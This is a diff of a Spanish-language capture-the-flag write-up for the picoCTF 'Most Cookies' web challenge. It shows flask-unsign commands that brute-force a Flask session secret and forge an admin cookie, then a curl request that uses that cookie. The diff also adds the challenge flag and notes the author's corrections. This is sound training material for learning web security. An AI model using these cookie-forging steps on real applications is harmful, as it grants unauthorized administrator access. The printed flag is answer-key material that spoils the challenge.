@@ -18,21 +18,24 @@ pip3 install flask-unsign
 - como nos dieron el codigo fuente con todas las listas de palabras creamos `nano cookies.txt` y dentro ponemos la lista de todas las palabras posibles separadas por salto de linea
 - usando esa lista aplicamos `flask-unsign --unsign --cookie "[cookie copiada]" --wordlist cookies.txt` y nos regresa la palabra secreta
 
-- Con la palabra secreta ahora aplicamos `flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret '[palabra secreta]' [cookie copiada]` 
+- Con la palabra secreta ahora aplicamos `flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret '[palabra secreta]'`
   y nos regresa una cookie de admin
 
-- Ahora aplicamos `curl -s http://mercury.picoctf.net:65344/display -H "Cookie: session=[cookie admin]" | grep pico` para que nos regrese la respuesta de admin y encontrar la bandera facil con un grep
+- Ahora aplicamos `curl -s [link de pagina]/display -H "Cookie: session=[cookie admin]" | grep pico` para que nos regrese la respuesta de admin y encontrar la bandera facil con un grep: **picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}**
 
 ## ALT
-- correr un script que no me funciono
+- correr un script que no me funciono :v
 ## Notas
 - una cookie de flask no es muy segura y depende de como las configuramos
-- trate de seguir una solucion pero no me da
-- luego veo un video para poder subirlo bien
-
-### **No se porque nomas me funciono 1 vez pero la bandera no sirvio y ya no volvio a servir**
+## Errores
+### No se porque nomas me funciono una vez pero la bandera no sirvio y ya no volvio a servir
 
 <img width="1047" height="589" alt="image" src="https://github.com/user-attachments/assets/f07d5ff1-218b-4517-8062-016569e29ef8" />
+## Correcion
+- al aplicar `flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret '[palabra secreta]'` estaba poniendo tambien la cookie copiada, y solo tenia que dar enter para que generara la cookie de admin
+- Al aplicar el curl estaba usando el link copiado del discord, pero necesitaba copiar el que tenia en mi propio navegador
+- Ahora me pregunta porque si sirvio 1 vez si lo tenia todo mal
 
 ## Referencias
 [PicoCTF 2021 — Most Cookies - Private User HQ - Medium](https://medium.com/private-user-hq/picoctf-2021-most-cookies-7f3d8b6cd0b)
+[picoCTF 2021 - [ Web ] - Most Cookies - YouTube](https://www.youtube.com/watch?v=ufs1xqSQCUM&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=66)
